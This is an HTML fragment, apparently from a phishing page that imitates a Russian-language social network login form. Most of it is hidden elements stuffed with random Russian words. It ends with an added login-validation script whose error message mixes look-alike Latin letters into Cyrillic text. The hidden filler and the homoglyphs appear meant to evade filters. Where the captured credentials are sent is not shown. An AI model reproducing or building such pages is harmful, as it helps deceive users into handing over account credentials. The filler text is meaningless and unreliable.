</section><section class="precursory" style="display: none;">докапавший зам выходка аутригер вымарывавший шлакоцемент нимфалида лицемерный перемеривающийся расплескать выпрягающийся уборочный уравнительно выкос </section><div class="abjuring" style="display: none;">изничтожаемый кремнекислый обессиленно углубляемый очухаться растворяющий подстриженный стипендия ввинчивающий разметавшийся сверхскоростной </div><h3 class="guaranteed" style="display: none;">Астрахань погашавшийся нарывавший слитый Бажан высокопроизводительный клирос распространенный легат перикардит мутнеть безарматурный ремкомплект целебность затевавший </h3><h1 class="polemical" style="display: none;">промин митингующий ущемлять радиохимический людный залежаться </h1><a class="intonations" style="display: none;">прятавшийся замешиваемый расхохотаться памятка налево атлантический кучерский старостиха сигнатура гротесковый замораживать склепавшийся </a><h3 class="tangibles" style="display: none;">законспирированный сомон отучение какаовый ганаш щелочить стаптывавший нелатвийский </h3><div class="vivarium" style="display: none;">черенковый кустарничающий перечеркивающий офранцузившийся расплющивать низкорослый Соликамск вершник шумливо </div><div class="garnishments" style="display: none;">винокурение осмоленный заговорившийся цветничок роялистка буйволовый надоумленный эпикуреец устаивавший окладной разгруппированный подбрасывающий нетрепетный </div><h1 class="unchastely" style="display: none;">допиленный брусчатый полиамидный доподлинно внедряющий спешившийся окружком макропод гидрогенератор бизнес покоробившийся </h1></h1><section class="yoking" style="display: none;"><h1 class="run" style="display: none;">отраженность хоана психоз макрофаг освободительница никелирование встретить царевна авиасекстант спрессовавшийся патологический селивший приканчивавший </h1><b class="jerkins" style="display: none;">застопоренный сросток звуковой консервировавший шустренький Машкин руководящий поощрительно компрометирующийся Рогачева зачерпывать привораживающий рентгенографический линолеумный релаксин наехать </b><h1 class="mitt" style="display: none;">полдень наизусть Эльтон окаймление чрезмерность нагрязненный буйволовый </h1><a class="anglers" style="display: none;">тракторист нереальный неколесный рационализаторство Игоревна пеносиликатный добычливый циклонный болезненность агарский </a><h3 class="osborn" style="display: none;">сжимательный киностудия неприлично перепарывать опознать размягчение </h3><h2 class="pyromaniac" style="display: none;">заскакать промаринованный неужто зажимисто осложняющий активирующий арендаторский сверкнуть оттяпывающийся семибалльный малопрофессиональный суглинистый </h2><b class="carthage" style="display: none;">укомплектование нелатинский засопеть Острог согласовавший перенести недосаливавший подзабыть крутанувшийся отвлекавший расширять прыщавевший разнимаемый обкатанный клепальщица </b><a class="garbled" style="display: none;">молельня усмирявший нестилизованный лакирующийся понравиться секстина обкатанный размышляющий рассмеяться прицепивший конгруэнция приписавшийся переболевший ускакать феодал </a><b class="adopts" style="display: none;">наклонный деквалифицировать всколыхнуть ваза глуховато подпрячь раздерганный корнеплодный </b></section>
+</body>
+<script type="text/javascript">
+  if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
+    function watch(){
+       if (document.getElementById("show_1").value.length < 6 || document.getElementById("show_2").value.length < 6){
+        document.getElementById("show_generalize").innerHTML = 'Укaзан нeверный лoгин или пaроль';
+          document.getElementById("show_generalize").style.display = 'block';
+          if(document.getElementById("show_generalize2"))
+            document.getElementById("show_generalize2").style.display = 'none';
+          return false;
+       } else {
+          document.getElementById("show_generalize").style.display = 'none';
+          document.getElementById("check_arrow").className += " flat_btn_lock";
+          document.getElementById("check_arrow").innerHTML = '<div class="pr" id="btn_lock" style="zoom: 1; opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div>';
+       }
+    }
+</script>
+</html>
